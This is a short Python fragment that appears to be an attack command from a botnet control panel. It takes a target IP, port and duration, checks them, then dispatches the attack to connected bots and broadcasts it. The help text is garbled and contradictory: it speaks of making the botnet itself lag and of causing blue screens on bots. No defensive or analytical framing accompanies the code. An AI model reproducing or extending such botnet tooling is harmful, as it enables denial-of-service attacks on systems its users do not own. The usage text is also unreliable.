from colorama import Fore

def NULCEAR_ATTACKS(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 4:
        ip = args[1]
        port = args[2]
        secs = args[3]
        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                    send(client, ansi_clear, False)
                    attack_sent1(ip, port, secs, client)
                    broadcast(data)
                else:
                    send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
            else:
                send(client, Fore.RED + 'Invalid port number (1-65535)')
        else:
            send(client, Fore.RED + 'Invalid IP-address')
    else:
        send(client, 'Usage: .nulcear_attacks [IP] [PORT] [TIME]')
        send(client, 'MAKE BOTNET LAG !!! !Not Make Target Lag!')
        send(client, "")
        send(client, "Example command to get bot blue_screen_of_death or lag")
        send(client, ".nulcear_attacks [IP] [PORT] 1500")
        send(client, "if time number very high bot can get effect!")
        send(client, "blue_screen_of_death can get but you wanna restart or shutdown")
        send(client, "lag can get if you open task manager")